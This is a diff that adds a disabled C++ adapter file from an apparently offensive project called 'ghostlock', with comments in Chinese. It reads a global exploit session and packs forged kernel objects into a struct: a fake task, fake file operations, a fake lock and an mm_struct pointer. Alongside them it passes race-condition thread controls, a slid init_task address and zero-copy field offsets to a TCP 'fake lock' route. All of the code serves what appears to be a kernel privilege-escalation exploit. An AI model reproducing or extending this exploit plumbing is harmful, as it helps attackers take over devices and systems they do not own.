@@ -1,0 +1,68 @@
+/**
+ * @file route_tcp_session.cpp.disabled
+ * @brief 已停用：tcp 的会话适配器（逻辑迁 Kotlin）。
+ * @note 恢复：mv route_tcp_session.cpp.disabled route_tcp_session.cpp。
+ */
+#include "route.h"
+#include "route_tcp.h"
+#include "session.h"
+#include "support.h"
+#include "profile.h"
+#include "profile_accessors.h"
+#include "memory.h"
+#include "params.h"
+#include "log.h"
+
+/* 迁移期保留的物理常量；Kotlin 传参后删除。 */
+#define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
+
+using namespace ghostlock;
+
+namespace ghostlock::route {
+    /**
+     * @brief 会话适配器：唯一读取 `g_exploit_session` 的位置（Kotlin 传参落地后删除）。
+     */
+    route::RouteStatus do_tcp_route_from_session(const memory::WriteRequest *request) {
+        auto &s = session::g_exploit_session;
+        core::TcpInputs in{
+            .page = {
+                .base = (s.heap.current.base),
+                .last_mm_struct = (s.heap.current.last_mm_struct),
+                .fake_lock = (s.heap.current.fake_lock),
+                .fake_w0 = (s.heap.current.fake_w0),
+                .fake_task = (s.heap.current.fake_task),
+                .fake_parent = (s.heap.current.fake_parent),
+                .fake_right = (s.heap.current.fake_right),
+                .fake_left = (s.heap.current.fake_left),
+                .fake_fops = (s.heap.current.fake_fops),
+            },
+            .race = {
+                .consumer_calls = &s.race.consumer_calls,
+                .consumer_success = &s.race.consumer_success,
+                .consumer_stop = &s.race.consumer_stop,
+                .consumer_go = &s.race.consumer_go,
+                .consumer_inflight = &s.race.consumer_inflight,
+                .waiter_tid = &s.race.waiter_tid,
+                .route_delay_usec = &s.race.route_delay_usec,
+            },
+            .request = request ? *request : memory::WriteRequest{},
+            .attempts = s.profile.tcp_attempts(),
+            .arm_sequence = s.profile.tcp_arm_sequence(),
+            .post_hold = s.profile.tcp_post_receive_hold_iterations(),
+            .mapping_length = static_cast<std::size_t>(TCP_PUNCH_SHMEM_LEN),
+            .waiter_task = ghostlock::profile::slide_init_task(),
+            /* TODO(P3-kotlin-params)：以下投影值在 Kotlin 传参落地后由 profile 提供。 */
+            .zerocopy_request_size = 0x40,
+            .zc_address_offset = 0x18,
+            .zc_length_offset = 0x20,
+            .zc_task_offset = 0x28,
+            .zc_lock_offset = 0x30,
+            .sendbuf_size = 64,
+            .sendbuf_fill = 0x33,
+            .punch_phase_spin = 10000000,
+            .log_every = 100,
+            .mapping_fill = 0x55,
+        };
+        return do_tcp_fake_lock_route(in);
+    }
+} // namespace ghostlock::route
